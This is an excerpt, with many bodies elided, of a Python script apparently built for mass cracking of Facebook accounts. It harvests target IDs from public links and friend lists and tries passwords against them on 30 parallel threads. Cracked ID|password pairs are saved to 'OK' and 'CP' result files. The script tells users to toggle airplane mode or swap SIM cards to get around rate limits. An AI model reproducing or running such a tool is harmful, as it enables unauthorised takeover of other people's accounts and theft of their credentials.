...
def banner():
	clear()
	wel = '# WELCOME TO YASEEN BRANDED UPDATE 2022'
	wel2 = mark(wel, style='cyan')
	sol().print(wel2)
	au='AUTHOR    :  MR YASEEN \https://github.com/YASEEN03139272656/yasin-\nWHATSAPP  : 03305867095'
	pengembang1=nel(au,style="cyan")
	cetak(nel(pengembang1, title=' DEVELOPER BY MR YASIN'))
...
def dump_publik():
	...
	sol().print(win2)
	print(x+'['+h+'•'+x+'] Types "me" enter you are friend id link')
	pil = input(x+'['+p+'f'+x+']  Input Target ID Link : ')
	try:
...
# DUMP ID MASSAL
def dump_massal():
	win = '# DUMP ID PUBLIC Link'
	win2 = mark(win, style='green')
	sol().print(win2)
	print(x+'['+h+'•'+x+'] ENTER TOTAL ID (LIMIT 20)')
	try:
		jum = int(input(x+'['+p+'f'+x+'] Enter ID: '))
	except ValueError:
	...
	yz = 0
	print(x+'['+h+'•'+x+'] Types "me" If you want to dump ID from friends')
	for met in range(jum):
		yz+=1
		kl = input(x+'['+h+str(yz)+x+'] Enter ID To 1 '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			...
			sol().print(lo, style='cyan')
			exit()
	tot = '#  SUCCESSFUL COLLECT %s ID'%(len(id))
	if len(id)==0:
...
# PENGATURAN ID
def setting():
	wl = '# SELECT YOUR SETTING'
	sol().print(mark(wl, style='green'))
	teks = '[01] Crack From Public OLD Account (Not Recommended)\n[02] Crack From New Account(Recommended)\n[03] Random Cloning(Highly Recommended)'
...
def passwrd():
	...
	krek = 'SAVED RUSELT : SOMAIL-BRAND OK/%s\nSAVED RUSELT: SOMAIL-BRAND CP/%s\nTurn Airplane Mode On/Off Every 5 Minutes'%(okc,cpc)
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('')
	tanya = '# Check the Ruselt Of SOMAIL-BRAND?'
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s<-> %s/%s <-> SOMAIL OK:%s <-> BRAND CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Menge (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
...
def cek_opsi():
	c = len(akun)
	hu = 'There is%s Account To Check\nnSebelum Mulai, Airplane Mode/Change Sim Card First'%(c)
